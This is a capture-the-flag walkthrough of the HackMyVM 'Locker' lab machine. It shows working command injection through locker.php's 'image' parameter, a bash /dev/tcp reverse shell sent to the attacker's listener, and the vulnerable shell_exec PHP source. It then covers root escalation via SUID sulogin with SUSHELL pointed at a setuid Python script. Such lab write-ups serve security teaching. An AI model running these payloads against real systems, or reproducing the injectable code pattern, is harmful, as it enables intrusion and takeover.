# Locker

## Executive Summary
| Machine | Author | Category | Platform |
| :--- | :--- | :--- | :--- |
| Locker | sml | Beginner | HackMyVM |

**Summary:** Locker is a beginner-level machine from HackMyVM that demonstrates a classic web application vulnerability leading to remote code execution. The attack path involves discovering a command injection vulnerability in a PHP script that processes image parameters through shell_exec(), followed by privilege escalation using a misconfigured SUID binary (sulogin) that can be exploited via environment variable manipulation to gain root access.

---

## Reconnaissance

### Network Discovery
Initial network scanning was performed to identify the target machine:

```powershell
PS D:\CTF_Tools> .\ScanNetwork-CTF.ps1
[*] Your IP  : 192.168.100.1
[*] Scanning : 192.168.100.0/24
[*] Status   : Pinging hosts...

[+] Virtual Targets Found:
------------------------------------------------------------

IP             MAC               Vendor
--             ---               ------
192.168.100.53 08:00:27:0E:6D:57 VirtualBox
```

### Port Scanning
A comprehensive Nmap scan revealed minimal attack surface:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/locker]
└─$ nmap -sC -sV -p- 192.168.100.53
Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-31 10:19 WIB
Nmap scan report for 192.168.100.53
Host is up (0.0025s latency).
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
80/tcp open  http    nginx 1.14.2
|_http-server-header: nginx/1.14.2
|_http-title: Site doesn't have a title (text/html).

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 23.29 seconds
```

Only port 80 (HTTP) was found open, running nginx 1.14.2.

### Web Application Analysis
Initial web reconnaissance revealed interesting content:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/locker]
└─$ curl -I 192.168.100.53
HTTP/1.1 200 OK
Server: nginx/1.14.2
Date: Sat, 31 Jan 2026 03:27:59 GMT
Content-Type: text/html
Content-Length: 142
Last-Modified: Fri, 22 Jan 2021 09:40:12 GMT
Connection: keep-alive
ETag: "600a9d7c-8e"
Accept-Ranges: bytes

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/locker]
└─$ curl 192.168.100.53
<h1>SUPER LOCKER</h1>
<pre>
Use root password to unlock our powers!
aAaaaAAaaAaAAaAAaAAaaaA!
<a href="/locker.php?image=1">Model 1</a>
</pre>
```

The main page revealed a "SUPER LOCKER" application with a link to `locker.php?image=1`, suggesting parameter-based functionality.

### Directory Enumeration
Directory brute-forcing discovered additional endpoints:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/locker]
└─$ feroxbuster -u http://192.168.100.53/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.13.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://192.168.100.53/
 🚩  In-Scope Url          │ 192.168.100.53
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.13.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        7l       12w      169c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET        1l        2w       58c http://192.168.100.53/locker.php
200      GET        6l       15w      142c http://192.168.100.53/index.html
[####################] - 6s      4752/4752    0s      found:3       errors:0
[####################] - 6s      4751/4751    836/s   http://192.168.100.53/  
```

The scan confirmed the existence of `locker.php` and `index.html` files.

---

## Initial Access

### Web Application Parameter Testing
Testing the `locker.php` endpoint revealed it processes image parameters:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/locker]
└─$ curl 192.168.100.53/locker.php
<img src="data:image/jpg;base64,"width="150"height="150"/>
```

Testing with the discovered parameter from the main page:

![](image.png)

The application displays different locker images based on the `image` parameter:
- Image 1 shows a heart-shaped padlock
- Image 2 displays a combination lock
- Image 3 shows a golden padlock
- Image 4 and beyond return broken image placeholders

![](image-1.png)

![](image-2.png)

![](image-3.png)

### Image Data Analysis
Downloading and analyzing the image data revealed they were base64-encoded:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/locker]
└─$ curl -s "http://192.168.100.53/locker.php?image=1" | grep -oP 'base64,\K[^"]+' | base64 -d > locker1.webp

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/locker]
└─$ curl -s "http://192.168.100.53/locker.php?image=2" | grep -oP 'base64,\K[^"]+' | base64 -d > locker2.jpg

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/locker]
└─$ curl -s "http://192.168.100.53/locker.php?image=3" | grep -oP 'base64,\K[^"]+' | base64 -d > locker3.jpg

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/locker]
└─$ ls -la loc*
-rw-r--r-- 1 ouba ouba 57 Jan 31 10:56 locker1.webp
-rw-r--r-- 1 ouba ouba 57 Jan 31 10:56 locker2.jpg
-rw-r--r-- 1 ouba ouba 57 Jan 31 10:56 locker3.jpg
```

### Command Injection Discovery
After extensive analysis including steganography tools and metadata examination, the key vulnerability was discovered in the URL parameter handling. The application was vulnerable to command injection via the `image` parameter when using semicolon delimiters:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/locker]
└─$ curl -s "http://192.168.100.53/locker.php?image=1;id;"
<img src="data:image/jpg;base64,uid=33(www-data) gid=33(www-data) groups=33(www-data)
"width="150"height="150"/>
```

The command injection was successful, confirming remote code execution as the `www-data` user.

### Reverse Shell Establishment
A reverse shell was established using the command injection vulnerability:

Terminal 1 (Listener setup):
```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/locker]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
```

Terminal 2 (Payload delivery):
```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/locker]
└─$ curl -s "http://192.168.100.53/locker.php?image=1;bash%20-c%20'bash%20-i%20%3E%26%20/dev/tcp/192.168.100.1/4444%200%3E%261';"
```

Successful connection:
```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/locker]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [172.21.44.133] from (UNKNOWN) [172.21.32.1] 52014
bash: cannot set terminal process group (314): Inappropriate ioctl for device
bash: no job control in this shell
www-data@locker:~/html$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### TTY Shell Upgrade
The shell was upgraded for better interaction:

```bash
www-data@locker:~/html$ python3 -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@locker:~/html$ ^Z
zsh: suspended  nc -lvnp 4444

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/locker]
└─$ stty raw -echo; fg
[1]  + continued  nc -lvnp 4444

www-data@locker:~/html$
```

### Vulnerability Root Cause Analysis
Examination of the vulnerable PHP code revealed the security flaw:

```bash
www-data@locker:~/html$ ls -la
total 196
drwxr-xr-x 2 root     root      4096 Jan 22  2021 .
drwxr-xr-x 3 root     root      4096 Jan 22  2021 ..
-rw-r--r-- 1 tolocker tolocker 45726 Jan 22  2021 1.jpg
-rw-r--r-- 1 tolocker tolocker 66605 Jan 22  2021 2.jpg
-rw-r--r-- 1 tolocker tolocker 62722 Jan 22  2021 3.jpg
-rw-r--r-- 1 root     root       142 Jan 22  2021 index.html
-rw-r--r-- 1 root     root       186 Jan 22  2021 locker.php
www-data@locker:~/html$ cat locker.php
<?php
$image = $_GET['image'];
$command = "cat ".$image.".jpg | base64";
$output = shell_exec($command);
print'<img src="data:image/jpg;base64,'.$output.'"width="150"height="150"/>';
?>
```

The PHP script directly concatenates user input into a shell command without any sanitization, making it vulnerable to command injection via the `shell_exec()` function.

---

## Privilege Escalation

### User Enumeration
Exploring the system revealed a user account `tolocker`:

```bash
www-data@locker:/var$ cd /home/tolocker
www-data@locker:/home/tolocker$ ls -la
total 36
drwxr-xr-x 3 tolocker tolocker 4096 Jan 22  2021 .
drwxr-xr-x 3 root     root     4096 Jan 22  2021 ..
-rw------- 1 tolocker tolocker   52 Jan 22  2021 .Xauthority
-rw-r--r-- 1 tolocker tolocker  220 Jan 22  2021 .bash_logout
-rw-r--r-- 1 tolocker tolocker 3526 Jan 22  2021 .bashrc
drwxr-xr-x 3 tolocker tolocker 4096 Jan 22  2021 .local
-rw-r--r-- 1 tolocker tolocker  807 Jan 22  2021 .profile
-rwxr-xr-x 1 tolocker tolocker 1920 Jan 22  2021 flag.sh
-rw------- 1 tolocker tolocker   14 Jan 22  2021 user.txt
```

### SUID Binary Discovery
A comprehensive search for SUID binaries revealed an interesting target:

```bash
www-data@locker:/$ find / -type f -perm -4000 -exec ls -la {} \; 2>/dev/null
-rwsr-xr-x 1 root root 436552 Jan 31  2020 /usr/lib/openssh/ssh-keysign
-rwsr-xr-- 1 root messagebus 51184 Jul  5  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 10232 Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
-rwsr-sr-x 1 root root 47184 Jan 10  2019 /usr/sbin/sulogin
-rwsr-xr-x 1 root root 34888 Jan 10  2019 /usr/bin/umount
-rwsr-xr-x 1 root root 84016 Jul 27  2018 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 44440 Jul 27  2018 /usr/bin/newgrp
-rwsr-xr-x 1 root root 54096 Jul 27  2018 /usr/bin/chfn
-rwsr-xr-x 1 root root 44528 Jul 27  2018 /usr/bin/chsh
-rwsr-xr-x 1 root root 63736 Jul 27  2018 /usr/bin/passwd
-rwsr-xr-x 1 root root 51280 Jan 10  2019 /usr/bin/mount
-rwsr-xr-x 1 root root 63568 Jan 10  2019 /usr/bin/su
```

The `/usr/sbin/sulogin` binary with SUID permissions was identified as a potential privilege escalation vector.

### Sulogin Analysis
Initial testing of the sulogin binary revealed locked root account behavior:

```bash
www-data@locker:/$ /usr/sbin/sulogin

Cannot open access to console, the root account is locked.
See sulogin(8) man page for more details.

Press Enter to continue.
www-data@locker:/$
```

Further investigation of the manual page revealed key information:

```bash
www-data@locker:/$ man sulogin
SULOGIN(8)                   System Administration                  SULOGIN(8)

NAME
       sulogin - single-user login

SYNOPSIS
       sulogin [options] [tty]

DESCRIPTION
       sulogin is invoked by init when the system goes into single-user mode.

       The user is prompted:

            Give root password for system maintenance
            (or type Control-D for normal startup):

       If  the root account is locked and --force is specified, no password is
       required.

       sulogin will be connected to the current terminal, or to  the  optional
       tty  device  that  can  be  specified  on  the  command line (typically
       /dev/console).

       When the user exits from the single-user shell, or presses control-D at
       the prompt, the system will continue to boot.

OPTIONS
       -e, --force
              If  the  default  method of obtaining the root password from the
              system via  getpwnam(3)  fails,  then  examine  /etc/passwd  and
              /etc/shadow  to get the password.  If these files are damaged or
              nonexistent, or when root account is locked by '!' or '*' at the
              begin of the password then sulogin will start a root shell with‐
              out asking for a password.

              Only use the -e option if you are sure the console is physically
              protected against unauthorized access.

       -p, --login-shell
              Specifying this option causes sulogin to start the shell process
              as a login shell.

       -t, --timeout seconds
              Specify the maximum amount of time to wait for user  input.   By
              default, sulogin will wait forever.

       -h, --help
              Display help text and exit.

       -V, --version
              Display version information and exit.

ENVIRONMENT VARIABLES
       sulogin looks for the environment variable SUSHELL or sushell to deter‐
       mine what shell to start.  If the environment variable is not  set,  it
       will  try  to execute root's shell from /etc/passwd.  If that fails, it
       will fall back to /bin/sh.

AUTHOR
       sulogin was written by Miquel van Smoorenburg for  sysvinit  and  later
       ported to util-linux by Dave Reisner and Karel Zak.

AVAILABILITY
       The  sulogin command is part of the util-linux package and is available
       from Linux Kernel Archive ⟨https://www.kernel.org/pub/linux/utils/util-
       linux/⟩.

util-linux                         July 2014                        SULOGIN(8)
```

Key findings from the manual:
1. The `-e` option allows bypassing password requirements when the root account is locked
2. The `SUSHELL` environment variable determines which shell to execute
3. The shell runs with elevated privileges when invoked through sulogin

### Privilege Escalation Exploit
Initial testing with the `-e` flag:

```bash
www-data@locker:/$ /usr/sbin/sulogin -e
Press Enter for maintenance
(or press Control-D to continue):
bash-5.0$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Although a shell was spawned, it retained the original user context. However, the manual indicated that sulogin respects the `SUSHELL` environment variable for shell selection.

### Exploitation via Environment Variable Manipulation
A custom Python script was created to leverage the SUID nature of sulogin:

```bash
www-data@locker:/$ cat > /tmp/root.py << 'EOF'
> #!/usr/bin/python3
> import os
> os.setuid(0)
> os.setgid(0)
> os.system('/bin/bash')
> EOF
www-data@locker:/$ chmod +x /tmp/root.py
www-data@locker:/$ export SUSHELL=/tmp/root.py
```

The script performs the following actions:
1. Sets the effective user ID to 0 (root)
2. Sets the effective group ID to 0 (root)
3. Spawns a bash shell with root privileges

### Root Access Achievement
Executing the exploit chain:

```bash
www-data@locker:/$ /usr/sbin/sulogin -e
Press Enter for maintenance
(or press Control-D to continue):
root@locker:~# id
uid=0(root) gid=0(root) groups=0(root),33(www-data)
root@locker:~# pwd
/root
root@locker:~# cat /root/root.txt /home/tolocker/user.txt
igo[REDACTED]
fla[REDACTED]
```

Successfully achieved root access and retrieved both user and root flags.

---

## Attack Chain Summary

1. **Reconnaissance**: Network scanning identified target IP 192.168.100.53 with only port 80 (nginx 1.14.2) exposed
2. **Vulnerability Discovery**: Web enumeration revealed `/locker.php` with an `image` parameter vulnerable to command injection via unsanitized `shell_exec()` usage
3. **Exploitation**: Command injection payload `image=1;[command];` executed arbitrary commands as `www-data` user, leading to reverse shell establishment
4. **Internal Enumeration**: System reconnaissance identified SUID binary `/usr/sbin/sulogin` with potential for privilege escalation via environment variable manipulation
5. **Privilege Escalation**: Exploited `sulogin -e` with custom `SUSHELL` environment variable pointing to a Python script that executes `setuid(0)` and `setgid(0)` to achieve root privileges